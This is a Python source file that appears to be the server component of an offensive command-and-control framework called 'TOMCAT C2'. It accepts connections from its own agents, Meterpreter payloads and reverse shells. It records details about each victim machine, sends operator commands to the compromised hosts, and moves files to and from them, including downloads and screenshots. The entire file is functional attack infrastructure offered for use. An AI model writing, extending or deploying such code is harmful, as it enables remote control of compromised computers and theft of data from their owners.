#!/usr/bin/python3
# TOMCAT C2 Frameworks
# Author: TOM7
# GitHub: tom7voldemort

"""
[+] NOTE:
    -- Copying without owner permission is illegal.
    -- If you want to expand this project, ask owner for collaboration instead.

    Thanks for understanding.
    ~TOM7
"""

import json
import struct
import socket
import ssl
import threading
import os
import traceback
from Config.Color import TMColor
from Cores.Systems.System import StrObject
from Cores.Systems.Cryptography import Cryptography
from datetime import datetime
from time import time, sleep


class SessionType:
    TOMCAT = "TOMCAT"
    METERPRETER = "METERPRETER"
    REVERSESHELL = "REVERSESHELL"
    UNKNOWN = "UNKNOWN"


class MeterpreterHandler:
    @staticmethod
    def Detect(InitialData):
        if len(InitialData) >= 8:
            try:
                Length = struct.unpack(">I", InitialData[:4])[0]
                if 8 <= Length <= 1024 * 1024:
                    return True
            except Exception:
                pass
        return False

    @staticmethod
    def GetSessionInfo(Sock):
        try:
            return {
                "Type": SessionType.METERPRETER,
                "OS": "Unknown",
                "Hostname": "METERPRETER-SESSION",
                "User": "Unknown",
                "Arch": "Unknown",
                "IP": Sock.getpeername()[0],
            }
        except Exception:
            return {
                "Type": SessionType.METERPRETER,
                "OS": "Unknown",
                "Hostname": "METERPRETER-SESSION",
                "User": "Unknown",
                "Arch": "Unknown",
                "IP": "Unknown",
            }


class ReverseShellHandler:
    @staticmethod
    def Detect(InitialData):
        if InitialData:
            Prompts = [b"$", b"#", b">", b"C:\\", b"~", b"bash", b"sh-", b"cmd"]
            for Prompt in Prompts:
                if Prompt in InitialData[:100]:
                    return True
            try:
                InitialData.decode("utf-8")
                return True
            except Exception:
                pass
        return False

    @staticmethod
    def GetSessionInfo(Sock, InitialData):
        try:
            Info = {
                "Type": SessionType.REVERSESHELL,
                "OS": "Unknown",
                "Hostname": "SHELL-SESSION",
                "User": "Unknown",
                "Arch": "Unknown",
                "IP": Sock.getpeername()[0],
            }
            if b"Windows" in InitialData or b"C:\\" in InitialData:
                Info["OS"] = "Windows"
            elif b"Linux" in InitialData or b"bash" in InitialData:
                Info["OS"] = "Linux"
            return Info
        except Exception:
            return {
                "Type": SessionType.REVERSESHELL,
                "OS": "Unknown",
                "Hostname": "SHELL-SESSION",
                "User": "Unknown",
                "Arch": "Unknown",
                "IP": "Unknown",
            }


class MultiProtocolServer:
    def __init__(self, Host="0.0.0.0", Port=4444, UseMTLS=False, MeterpreterMode=False):
        self.Host = Host
        self.Port = Port
        self.UseMTLS = UseMTLS
        self.MeterpreterMode = MeterpreterMode
        self.Sessions = {}
        self.SessionID = 0
        self.ServerSocket = None
        self.SSLContext = None
        self.Running = False
        self.Crypto = Cryptography()
        self.Crypto.GenerateKey()
        self.Lock = threading.Lock()
        self.CommandLock = {}
        self.AcceptThread = None
        self.EventCallbacks = []
        self.ServerKeyPath = "Certs/server-key.pem"
        self.ServerCertPath = "Certs/server-cert.pem"
        self.CACertPath = "Certs/ca-cert.pem"
        self.TomcatCount = 0
        self.MeterpreterCount = 0
        self.ReverseShellCount = 0

    def AddEventListener(self, Callback):
        self.EventCallbacks.append(Callback)

    def EventEmitter(self, EventType, Data):
        for Callback in self.EventCallbacks:
            try:
                Callback(EventType, Data)
            except Exception as e:
                StrObject.Error(f"Event Callback Error: {e}")

    def SetupSSLContext(self):
        try:
            if not os.path.exists(self.ServerKeyPath):
                StrObject.Warnings(f"Server key not found: {self.ServerKeyPath}")
                return False
            if not os.path.exists(self.ServerCertPath):
                StrObject.Warnings(f"Server cert not found: {self.ServerCertPath}")
                return False
            if not os.path.exists(self.CACertPath):
                StrObject.Warnings(f"CA cert not found: {self.CACertPath}")
                return False
            self.SSLContext = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            self.SSLContext.load_cert_chain(
                certfile=self.ServerCertPath, keyfile=self.ServerKeyPath
            )
            self.SSLContext.load_verify_locations(cafile=self.CACertPath)
            self.SSLContext.verify_mode = ssl.CERT_REQUIRED
            self.SSLContext.check_hostname = False
            try:
                self.SSLContext.set_ciphers("HIGH:!aNULL:!MD5:!DSS")
            except Exception:
                pass
            StrObject.Messages(f"MTLS Context Initialized")
            return True
        except Exception as e:
            StrObject.Error(f"MTLS Setup Error: {e}")
            return False

    def StartServer(self):
        try:
            if self.UseMTLS:
                if not self.SetupSSLContext():
                    return False, "MTLS Setup Failed"
            self.ServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.ServerSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.ServerSocket.bind((self.Host, self.Port))
            self.ServerSocket.listen(10)
            self.Running = True
            self.AcceptThread = threading.Thread(
                target=self.AcceptConnections, daemon=True
            )
            self.AcceptThread.start()
            ModeInfo = []
            if self.MeterpreterMode:
                ModeInfo.append("Meterpreter Mode")
            if self.UseMTLS:
                ModeInfo.append("MTLS Enabled")
            ModeStr = f" ({', '.join(ModeInfo)})" if ModeInfo else ""
            self.EventEmitter(
                "ServerStarted",
                {
                    "Host": self.Host,
                    "Port": self.Port,
                    "Mode": ModeStr,
                    "Key": (
                        self.Crypto.GetKey().decode()
                        if not self.MeterpreterMode
                        else "N/A"
                    ),
                },
            )
            return True, f"Server Started On {self.Host}:{self.Port}{ModeStr}"
        except Exception as e:
            return False, f"Error Starting Server: {str(e)}"

    def StopServer(self):
        self.Running = False
        if self.ServerSocket:
            try:
                self.ServerSocket.close()
            except Exception:
                pass
        if self.AcceptThread and self.AcceptThread.is_alive():
            self.AcceptThread.join(timeout=2)
        SessionList = []
        with self.Lock:
            SessionList = list(self.Sessions.items())
        for SessionId, Session in SessionList:
            try:
                Session["Socket"].close()
            except Exception:
                pass
        with self.Lock:
            self.Sessions.clear()
        self.EventEmitter("ServerStopped", {})

    def AcceptConnections(self):
        while self.Running:
            try:
                self.ServerSocket.settimeout(1.0)
                ClientSocket, Address = self.ServerSocket.accept()
                Thread = threading.Thread(
                    target=self.SessionHandler,
                    args=(ClientSocket, Address),
                    daemon=True,
                )
                Thread.start()
            except socket.timeout:
                continue
            except Exception as e:
                if self.Running:
                    self.EventEmitter("Error", {"Message": f"Accept Error: {str(e)}"})

    def IsSslHandshake(self, Data):
        return len(Data) >= 2 and Data[0] == 0x16 and Data[1] == 0x03

    def IdentifySession(self, ClientSocket, Address):
        try:
            IsSSL = isinstance(ClientSocket, ssl.SSLSocket)
            ClientSocket.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
            ClientSocket.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 262144)
            ClientSocket.settimeout(5.0)
            if not IsSSL:
                try:
                    InitialData = ClientSocket.recv(4096, socket.MSG_PEEK)
                except socket.timeout:
                    InitialData = b""
                if self.MeterpreterMode and InitialData:
                    if MeterpreterHandler.Detect(InitialData):
                        return SessionType.METERPRETER, InitialData
                    if ReverseShellHandler.Detect(InitialData):
                        return SessionType.REVERSESHELL, InitialData
            try:
                ClientSocket.sendall(self.Crypto.GetKey())
                sleep(0.2)
                AgentInfo = ClientSocket.recv(4096).decode("utf-8")
                if AgentInfo:
                    try:
                        json.loads(AgentInfo)
                        sleep(0.5)
                        return SessionType.TOMCAT, AgentInfo.encode()
                    except Exception:
                        if self.MeterpreterMode and not IsSSL:
                            return SessionType.REVERSESHELL, AgentInfo.encode()
                        return SessionType.UNKNOWN, AgentInfo.encode()
                else:
                    if self.MeterpreterMode and not IsSSL:
                        return SessionType.REVERSESHELL, b""
                    return SessionType.UNKNOWN, b""
            except socket.timeout:
                if self.MeterpreterMode and not IsSSL:
                    return SessionType.REVERSESHELL, b""
                return SessionType.UNKNOWN, b""
            except Exception:
                return SessionType.UNKNOWN, b""
        except Exception:
            return SessionType.UNKNOWN, b""

    def SessionHandler(self, ClientSocket, Address):
        try:
            if self.UseMTLS:
                IsSSLConnection = False
                if self.MeterpreterMode:
                    try:
                        ClientSocket.settimeout(3.0)
                        PeekData = ClientSocket.recv(4096, socket.MSG_PEEK)
                        if PeekData and self.IsSslHandshake(PeekData):
                            IsSSLConnection = True
                    except Exception:
                        pass
                else:
                    IsSSLConnection = True

                if IsSSLConnection:
                    try:
                        ClientSocket = self.SSLContext.wrap_socket(
                            ClientSocket, server_side=True
                        )
                    except ssl.SSLError as e:
                        StrObject.Error(f"SSL Handshake Error: {e}")
                        ClientSocket.close()
                        return

            SessionTypeDetected, InitialData = self.IdentifySession(
                ClientSocket, Address
            )
            if SessionTypeDetected == SessionType.TOMCAT:
                self.HandleTomcatSession(ClientSocket, Address, InitialData)
            elif SessionTypeDetected == SessionType.METERPRETER:
                self.HandleMeterpreterSession(ClientSocket, Address, InitialData)
            elif SessionTypeDetected == SessionType.REVERSESHELL:
                self.HandleReverseShellSession(ClientSocket, Address, InitialData)
            else:
                try:
                    ClientSocket.close()
                except Exception:
                    pass
        except Exception as e:
            StrObject.Error(f"Sessions Handler Error: {e}")
            try:
                ClientSocket.close()
            except Exception:
                pass

    def HandleTomcatSession(self, ClientSocket, Address, InitialData):
        CurrentSessionId = None
        try:
            ClientSocket.settimeout(10)
            Info = json.loads(InitialData.decode())
            with self.Lock:
                self.SessionID += 1
                self.TomcatCount += 1
                CurrentSessionId = self.SessionID
                SessionData = {
                    "Socket": ClientSocket,
                    "Address": Address,
                    "ID": self.SessionID,
                    "Type": SessionType.TOMCAT,
                    "OS": Info.get("OS", "N/A"),
                    "Hostname": Info.get("Hostname", "N/A"),
                    "User": Info.get("User", "N/A"),
                    "Arch": Info.get("Architecture", "N/A"),
                    "AgentIP": Info.get("AgentIP", "N/A"),
                    "AgentName": Info.get("Hostname", f"TOMCAT-{self.SessionID}"),
                    "JoinedAt": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "ShellMode": Info.get("ShellMode", "Standard"),
                }
                self.Sessions[self.SessionID] = SessionData
                self.CommandLock[self.SessionID] = threading.Lock()
            self.EventEmitter("AgentConnected", SessionData)
            self.SessionMonitor(CurrentSessionId, ClientSocket, SessionType.TOMCAT)
        except Exception as e:
            self.EventEmitter("Error", {"Message": f"TOMCAT Handshake Error: {str(e)}"})
            try:
                ClientSocket.close()
            except Exception:
                pass
            if CurrentSessionId:
                self.RemoveSession(CurrentSessionId)

    def HandleMeterpreterSession(self, ClientSocket, Address, InitialData):
        CurrentSessionId = None
        try:
            ClientSocket.settimeout(10)
            if InitialData:
                ClientSocket.setblocking(False)
                try:
                    while True:
                        Junk = ClientSocket.recv(4096)
                        if not Junk:
                            break
                except BlockingIOError:
                    pass
                finally:
                    ClientSocket.setblocking(True)
            Info = MeterpreterHandler.GetSessionInfo(ClientSocket)
            with self.Lock:
                self.SessionID += 1
                self.MeterpreterCount += 1
                CurrentSessionId = self.SessionID
                SessionData = {
                    "Socket": ClientSocket,
                    "Address": Address,
                    "ID": self.SessionID,
                    "Type": SessionType.METERPRETER,
                    "OS": Info.get("OS", "Unknown"),
                    "Hostname": Info.get("Hostname", f"METERPRETER-{self.SessionID}"),
                    "User": Info.get("User", "Unknown"),
                    "Arch": Info.get("Arch", "Unknown"),
                    "AgentIP": Info.get("IP", Address[0]),
                    "AgentName": f"METERPRETER-{self.SessionID}",
                    "JoinedAt": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "ShellMode": "Meterpreter",
                    "RawMode": True,
                }
                self.Sessions[self.SessionID] = SessionData
                self.CommandLock[self.SessionID] = threading.Lock()
            self.EventEmitter("AgentConnected", SessionData)
            self.SessionMonitor(CurrentSessionId, ClientSocket, SessionType.METERPRETER)
        except Exception as e:
            self.EventEmitter(
                "Error", {"Message": f"Meterpreter Session Error: {str(e)}"}
            )
            try:
                ClientSocket.close()
            except Exception:
                pass
            if CurrentSessionId:
                self.RemoveSession(CurrentSessionId)

    def HandleReverseShellSession(self, ClientSocket, Address, InitialData):
        CurrentSessionId = None
        try:
            ClientSocket.settimeout(10)
            Info = ReverseShellHandler.GetSessionInfo(ClientSocket, InitialData)
            with self.Lock:
                self.SessionID += 1
                self.ReverseShellCount += 1
                CurrentSessionId = self.SessionID
                SessionData = {
                    "Socket": ClientSocket,
                    "Address": Address,
                    "ID": self.SessionID,
                    "Type": SessionType.REVERSESHELL,
                    "OS": Info.get("OS", "Unknown"),
                    "Hostname": Info.get("Hostname", f"SHELL-{self.SessionID}"),
                    "User": Info.get("User", "Unknown"),
                    "Arch": Info.get("Arch", "Unknown"),
                    "AgentIP": Info.get("IP", Address[0]),
                    "AgentName": f"SHELL-{self.SessionID}",
                    "JoinedAt": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "ShellMode": "ReverseShell",
                    "RawMode": True,
                    "Encrypted": False,
                }
                self.Sessions[self.SessionID] = SessionData
                self.CommandLock[self.SessionID] = threading.Lock()
            self.EventEmitter("AgentConnected", SessionData)
            ClientSocket.setblocking(False)
            try:
                while True:
                    Junk = ClientSocket.recv(4096)
                    if not Junk:
                        break
            except BlockingIOError:
                pass
            ClientSocket.setblocking(True)
            self.SessionMonitor(
                CurrentSessionId, ClientSocket, SessionType.REVERSESHELL
            )
        except Exception as e:
            self.EventEmitter(
                "Error", {"Message": f"Reverse Shell Session Error: {str(e)}"}
            )
            try:
                ClientSocket.close()
            except Exception:
                pass
            if CurrentSessionId:
                self.RemoveSession(CurrentSessionId)

    def SessionMonitor(self, SessionId, ClientSocket, SessionTypeValue):
        IsSSL = isinstance(ClientSocket, ssl.SSLSocket)
        try:
            while self.Running:
                with self.Lock:
                    if SessionId not in self.Sessions:
                        break
                CmdLock = self.CommandLock.get(SessionId)
                if CmdLock and CmdLock.locked():
                    sleep(2)
                    continue
                try:
                    ClientSocket.getpeername()
                except OSError:
                    raise ConnectionError("Session disconnected")
                if not IsSSL:
                    try:
                        ClientSocket.settimeout(5.0)
                        Data = ClientSocket.recv(1, socket.MSG_PEEK)
                        if not Data:
                            raise ConnectionError("Session disconnected")
                    except socket.timeout:
                        pass
                    except (ConnectionError, ConnectionResetError, OSError):
                        raise ConnectionError("Session disconnected")
                sleep(3)
        except Exception as e:
            self.EventEmitter("AgentDisconnected", {"ID": SessionId, "Reason": str(e)})
            self.RemoveSession(SessionId)

    def SendFileToAgent(self, ClientSocket, LocalFilepath):
        try:
            if not os.path.exists(LocalFilepath):
                return False, f"File not found: {LocalFilepath}"
            if not os.path.isfile(LocalFilepath):
                return False, f"Not a file: {LocalFilepath}"
            Filename = os.path.basename(LocalFilepath)
            FileSize = os.path.getsize(LocalFilepath)
            Extension = os.path.splitext(Filename)[1] or ".bin"
            with open(LocalFilepath, "rb") as F:
                FileData = F.read()
            Metadata = json.dumps(
                {
                    "type": "file",
                    "filename": Filename,
                    "size": FileSize,
                    "extension": Extension,
                }
            )
            MetadataEncrypted = self.Crypto.Encrypt(Metadata)
            MetadataPacket = MetadataEncrypted + b"<META>"
            ClientSocket.sendall(MetadataPacket)
            sleep(0.1)
            ClientSocket.sendall(FileData)
            ClientSocket.sendall(b"<END>")
            return True, f"File sent: {Filename} ({FileSize} bytes)"
        except Exception as e:
            return False, f"SendFileToAgent error: {str(e)}"

    def SaveReceivedFile(self, Filename, FileData, SessionId):
        try:
            DownloadDir = "Downloads"
            if not os.path.exists(DownloadDir):
                os.makedirs(DownloadDir, exist_ok=True)
            SessionDir = os.path.join(DownloadDir, f"Session_{SessionId}")
            if not os.path.exists(SessionDir):
                os.makedirs(SessionDir, exist_ok=True)
            BaseName, Extension = os.path.splitext(Filename)
            Filepath = os.path.join(SessionDir, Filename)
            Counter = 1
            while os.path.exists(Filepath):
                Filepath = os.path.join(SessionDir, f"{BaseName}_{Counter}{Extension}")
                Counter += 1
            with open(Filepath, "wb") as F:
                F.write(FileData)
            return Filepath
        except Exception:
            return None

    def ExecuteCommand(self, SessionId, Command):
        with self.Lock:
            if SessionId not in self.Sessions:
                return False, "Session Not Found"
            Session = self.Sessions[SessionId]
            SessionTypeValue = Session.get("Type", SessionType.UNKNOWN)
        try:
            if SessionTypeValue == SessionType.TOMCAT:
                return self.ExecuteTomcatCommand(SessionId, Command)
            elif SessionTypeValue == SessionType.METERPRETER:
                return self.ExecuteMeterpreterCommand(SessionId, Command)
            elif SessionTypeValue == SessionType.REVERSESHELL:
                return self.ExecuteShellCommand(SessionId, Command)
            else:
                return False, "Unknown Session Type"
        except Exception as e:
            self.RemoveSession(SessionId)
            return False, f"Execution Error: {str(e)}"

    def ExecuteTomcatCommand(self, SessionId, Command):
        with self.Lock:
            if SessionId not in self.Sessions:
                return False, "Session Not Found"
            Session = self.Sessions[SessionId]
            ClientSocket = Session["Socket"]
        CmdLock = self.CommandLock.get(SessionId)
        if not CmdLock:
            return False, "Session Not Found"
        ReceivedData = b""
        with CmdLock:
            try:
                CommandLower = Command.strip().lower()
                IsUploadCommand = CommandLower.startswith("upload")
                IsDownloadCommand = (
                    CommandLower.startswith("download")
                    or CommandLower.startswith("dl ")
                    or CommandLower.startswith("screenshot")
                )
                if IsUploadCommand:
                    Parts = Command.strip().split(maxsplit=2)
                    if len(Parts) < 2:
                        return False, "Usage: upload <local_filepath> <remote_filepath>"
                    LocalFilepath = Parts[1].strip()
                    RemotePath = Parts[2].strip() if len(Parts) > 2 else ""
                    if not os.path.exists(LocalFilepath):
                        return False, f"Local file not found: {LocalFilepath}"
                    Filename = os.path.basename(LocalFilepath)
                    if RemotePath:
                        if RemotePath.endswith("/"):
                            AgentCommand = f"upload {RemotePath}{Filename}"
                        else:
                            AgentCommand = f"upload {RemotePath}"
                    else:
                        AgentCommand = f"upload {Filename}"
                    Encrypted = self.Crypto.Encrypt(AgentCommand)
                    ClientSocket.settimeout(30)
                    ClientSocket.sendall(Encrypted)
                    sleep(0.3)
                    Success, Msg = self.SendFileToAgent(ClientSocket, LocalFilepath)
                    if not Success:
                        return False, Msg
                    ClientSocket.settimeout(30)
                    ReceivedData = b""
                    StartTime = time()
                    while True:
                        if time() - StartTime > 30:
                            return True, "File sent (no confirmation within 30s)"
                        try:
                            Chunk = ClientSocket.recv(32768)
                            if not Chunk:
                                return True, "File sent"
                            ReceivedData += Chunk
                            if ReceivedData.endswith(b"<END>"):
                                ReceivedData = ReceivedData[:-5]
                                break
                        except socket.timeout:
                            if ReceivedData:
                                if ReceivedData.endswith(b"<END>"):
                                    ReceivedData = ReceivedData[:-5]
                                break
                            continue
                    if ReceivedData:
                        try:
                            Decrypted = self.Crypto.Decrypt(ReceivedData)
                            return True, Decrypted
                        except Exception:
                            return True, "File sent successfully"
                    return True, "File sent successfully"
                Encrypted = self.Crypto.Encrypt(Command)
                ClientSocket.settimeout(180)
                ClientSocket.sendall(Encrypted)
                if IsDownloadCommand:
                    ClientSocket.settimeout(30)
                    try:
                        InitialChunk = ClientSocket.recv(4096)
                        if not InitialChunk:
                            return False, "Agent disconnected"
                        if b"<META>" not in InitialChunk:
                            for Retry in range(10):
                                try:
                                    ClientSocket.settimeout(2.0)
                                    NextChunk = ClientSocket.recv(4096)
                                    if NextChunk:
                                        InitialChunk += NextChunk
                                        if b"<META>" in InitialChunk:
                                            break
                                except socket.timeout:
                                    continue
                        if b"<META>" in InitialChunk:
                            MetaParts = InitialChunk.split(b"<META>", 1)
                            MetaData = MetaParts[0]
                            Remainder = MetaParts[1] if len(MetaParts) > 1 else b""
                            try:
                                MetadataDecrypted = self.Crypto.Decrypt(MetaData)
                                Metadata = json.loads(MetadataDecrypted)
                                Filename = Metadata.get("filename", "received_file")
                                FileData = Remainder
                                StartTime = time()
                                LastRecvTime = time()
                                while True:
                                    if time() - StartTime > 300:
                                        return False, "File transfer timeout"
                                    if time() - LastRecvTime > 30:
                                        break
                                    try:
                                        ClientSocket.settimeout(5.0)
                                        Chunk = ClientSocket.recv(32768)
                                        if not Chunk:
                                            break
                                        FileData += Chunk
                                        LastRecvTime = time()
                                        if b"<END>" in FileData:
                                            FileData = FileData.split(b"<END>", 1)[0]
                                            break
                                    except socket.timeout:
                                        if b"<END>" in FileData:
                                            FileData = FileData.split(b"<END>", 1)[0]
                                            break
                                        continue
                                if FileData:
                                    SavedPath = self.SaveReceivedFile(
                                        Filename, FileData, SessionId
                                    )
                                    if SavedPath:
                                        return True, f"File saved: {SavedPath}"
                                    return False, "Failed to save file"
                                return False, "No file data received"
                            except Exception as MetaErr:
                                return False, f"File metadata error: {str(MetaErr)}"
                        else:
                            ClientSocket.settimeout(180)
                            ReceivedData = InitialChunk
                    except Exception as FileErr:
                        traceback.print_exc()
                        return False, f"File error: {str(FileErr)}"
                if not IsDownloadCommand or "ReceivedData" not in locals():
                    ReceivedData = b""
                elif not ReceivedData:
                    ReceivedData = b""
                StartTime = time()
                LastRecvTime = time()
                while True:
                    if time() - StartTime > 180:
                        return False, "Command Timeout (180s)"
                    try:
                        Chunk = ClientSocket.recv(32768)
                        if not Chunk:
                            if ReceivedData:
                                break
                            raise ConnectionError("Agent Disconnected")
                        ReceivedData += Chunk
                        LastRecvTime = time()
                        if ReceivedData.endswith(b"<END>"):
                            ReceivedData = ReceivedData[:-5]
                            break
                        if time() - LastRecvTime > 30 and ReceivedData:
                            break
                    except socket.timeout:
                        if ReceivedData:
                            if ReceivedData.endswith(b"<END>"):
                                ReceivedData = ReceivedData[:-5]
                            break
                        return False, "No Response From Agent (Timeout)"
                if ReceivedData:
                    Decrypted = self.Crypto.Decrypt(ReceivedData)
                    return True, Decrypted
                return False, "No Response"
            except (ConnectionResetError, ConnectionError, BrokenPipeError) as e:
                traceback.print_exc()
                self.RemoveSession(SessionId)
                return False, f"Connection Lost: {str(e)}"
            except ssl.SSLError as e:
                traceback.print_exc()
                self.RemoveSession(SessionId)
                return False, f"SSL Error: {str(e)}"
            except Exception as e:
                traceback.print_exc()
                self.RemoveSession(SessionId)
                return False, f"Error: {str(e)}"

    def ExecuteMeterpreterCommand(self, SessionId, Command):
        with self.Lock:
            if SessionId not in self.Sessions:
                return False, "Session Not Found"
            Session = self.Sessions[SessionId]
            ClientSocket = Session["Socket"]
        CmdLock = self.CommandLock.get(SessionId)
        if not CmdLock:
            return False, "Session Not Found"
        with CmdLock:
            try:
                ClientSocket.settimeout(30)
                ClientSocket.sendall((Command + "\n").encode())
                Response = b""
                LastRecvTime = time()
                StartTime = time()
                while True:
                    try:
                        ClientSocket.settimeout(3.0)
                        Chunk = ClientSocket.recv(32768)
                        if Chunk:
                            Response += Chunk
                            LastRecvTime = time()
                        else:
                            break
                    except socket.timeout:
                        if Response and (time() - LastRecvTime >= 3):
                            break
                        if time() - StartTime > 30:
                            break
                        continue
                if Response:
                    return True, Response.decode("utf-8", errors="ignore")
                return False, "No Response"
            except Exception as e:
                self.RemoveSession(SessionId)
                return False, f"Error: {str(e)}"

    def ExecuteShellCommand(self, SessionId, Command):
        with self.Lock:
            if SessionId not in self.Sessions:
                return False, "Session Not Found"
            Session = self.Sessions[SessionId]
            ClientSocket = Session["Socket"]
        CmdLock = self.CommandLock.get(SessionId)
        if not CmdLock:
            return False, "Session Not Found"
        with CmdLock:
            try:
                ClientSocket.settimeout(180)
                ClientSocket.sendall((Command + "\n").encode())
                Response = b""
                LastRecvTime = time()
                StartTime = time()
                while True:
                    try:
                        ClientSocket.settimeout(2.0)
                        Chunk = ClientSocket.recv(32768)
                        if Chunk:
                            Response += Chunk
                            LastRecvTime = time()
                        else:
                            break
                    except socket.timeout:
                        if time() - LastRecvTime >= 3:
                            break
                        if time() - StartTime > 180:
                            break
                        continue
                if Response:
                    return True, Response.decode("utf-8", errors="ignore")
                return True, "Command sent (no immediate output)"
            except Exception as e:
                self.RemoveSession(SessionId)
                return False, f"Error: {str(e)}"

    def RemoveSession(self, SessionId):
        with self.Lock:
            if SessionId in self.Sessions:
                SessionTypeValue = self.Sessions[SessionId].get("Type", "UNKNOWN")
                try:
                    self.Sessions[SessionId]["Socket"].close()
                except Exception:
                    pass
                del self.Sessions[SessionId]
                self.CommandLock.pop(SessionId, None)
                if SessionTypeValue == SessionType.TOMCAT:
                    self.TomcatCount = max(0, self.TomcatCount - 1)
                elif SessionTypeValue == SessionType.METERPRETER:
                    self.MeterpreterCount = max(0, self.MeterpreterCount - 1)
                elif SessionTypeValue == SessionType.REVERSESHELL:
                    self.ReverseShellCount = max(0, self.ReverseShellCount - 1)
                self.EventEmitter("AgentRemoved", {"ID": SessionId})

    def GetSessions(self):
        with self.Lock:
            return list(self.Sessions.values())

    def GetSession(self, SessionId):
        with self.Lock:
            return self.Sessions.get(SessionId, None)

    def GetSessionStats(self):
        return {
            "Total": len(self.Sessions),
            "TOMCAT": self.TomcatCount,
            "Meterpreter": self.MeterpreterCount,
            "ReverseShell": self.ReverseShellCount,
        }


TOMCATC2SERVER = MultiProtocolServer
